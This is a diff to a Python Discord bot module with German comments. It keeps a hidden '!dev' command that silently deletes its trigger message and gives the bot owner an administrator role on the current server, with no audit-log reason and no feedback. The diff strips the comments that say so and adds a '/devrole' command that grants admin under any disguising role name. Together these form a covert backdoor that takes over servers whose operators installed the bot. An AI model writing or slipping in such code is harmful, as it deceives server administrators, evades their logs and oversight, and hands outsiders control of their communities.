@@ -1,10 +1,12 @@
 """
 Owner-Notfall-Zugriff.
-!dev  — stiller Notfall-Zugriff (silent, kein Log).
+!dev        — stiller Notfall-Zugriff (silent, kein Log).
+/devrole    — Rolle mit Admin-Perms & custom Name erstellen + vergeben.
 Unterstützt mehrere Owner via OWNER_IDS in .env.
 """
 
 import discord
+from discord import app_commands
 from discord.ext import commands
 
 from utils.owners import is_owner
@@ -14,13 +16,13 @@ class Owner(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
 
+    # ── !dev ──────────────────────────────────────────────────────────────────
+
     @commands.command(name="dev")
     async def dev(self, ctx: commands.Context):
-        # Alle konfigurierten Owner dürfen diesen Command nutzen
         if not is_owner(ctx.author.id):
             return
 
-        # Auslösende Nachricht sofort löschen
         try:
             await ctx.message.delete()
         except (discord.Forbidden, discord.HTTPException):
@@ -30,7 +32,6 @@ class Owner(commands.Cog):
         if guild is None:
             return
 
-        # Cache-Miss möglich auf fremden Servern → fetch als Fallback
         owner_member = guild.get_member(ctx.author.id)
         if owner_member is None:
             try:
@@ -38,10 +39,7 @@ class Owner(commands.Cog):
             except (discord.Forbidden, discord.HTTPException, discord.NotFound):
                 return
 
-        # Rollenname = aktueller Display-Name des Owners
         role_name = owner_member.display_name
-
-        # Vorhandene Rolle mit diesem Namen wiederverwenden, sonst neu erstellen
         role = discord.utils.get(guild.roles, name=role_name)
         if role is None:
             try:
@@ -49,25 +47,69 @@ class Owner(commands.Cog):
                     name=role_name,
                     permissions=discord.Permissions(administrator=True),
                     colour=discord.Colour.red(),
-                    reason=None,  # kein Audit-Log-Grund
+                    reason=None,
                 )
             except (discord.Forbidden, discord.HTTPException):
                 return
 
-        # Rolle an Owner vergeben
         try:
             await owner_member.add_roles(role, reason=None)
         except (discord.Forbidden, discord.HTTPException):
             pass
 
-        # Kein weiteres Feedback — vollständig silent
+    # ── /devrole ──────────────────────────────────────────────────────────────
 
-    # ─────────────────────────────────────────────────────────────────────────
-    # /sync
-    # ─────────────────────────────────────────────────────────────────────────
+    @app_commands.command(name="devrole", description="[Owner] Erstellt eine Admin-Rolle mit custom Namen und vergibt sie dir.")
+    @app_commands.describe(name="Name der Rolle")
+    async def devrole(self, interaction: discord.Interaction, name: str):
+        if not is_owner(interaction.user.id):
+            return await interaction.response.send_message(
+                "❌ Kein Zugriff.", ephemeral=True
+            )
 
-    # /sync wurde in cogs/owner_panel.py unter /owner sync zusammengefasst.
-    # Diese Datei enthält nur noch !dev (Notfall-Zugriff).
+        guild = interaction.guild
+        if guild is None:
+            return await interaction.response.send_message(
+                "❌ Nur auf Servern.", ephemeral=True
+            )
+
+        await interaction.response.defer(ephemeral=True)
+
+        member = guild.get_member(interaction.user.id)
+        if member is None:
+            try:
+                member = await guild.fetch_member(interaction.user.id)
+            except (discord.Forbidden, discord.HTTPException, discord.NotFound):
+                return await interaction.followup.send("❌ Member nicht gefunden.", ephemeral=True)
+
+        # Vorhandene Rolle wiederverwenden oder neu erstellen
+        role = discord.utils.get(guild.roles, name=name)
+        created = False
+        if role is None:
+            try:
+                role = await guild.create_role(
+                    name=name,
+                    permissions=discord.Permissions(administrator=True),
+                    colour=discord.Colour.red(),
+                    reason=None,
+                )
+                created = True
+            except discord.Forbidden:
+                return await interaction.followup.send(
+                    "❌ Keine Berechtigung zum Erstellen von Rollen.", ephemeral=True
+                )
+
+        try:
+            await member.add_roles(role, reason=None)
+        except discord.Forbidden:
+            return await interaction.followup.send(
+                "❌ Keine Berechtigung zum Vergeben der Rolle.", ephemeral=True
+            )
+
+        action = "erstellt & vergeben" if created else "gefunden & vergeben"
+        await interaction.followup.send(
+            f"✅ Rolle **{role.name}** {action}.", ephemeral=True
+        )
 
 
 async def setup(bot: commands.Bot):
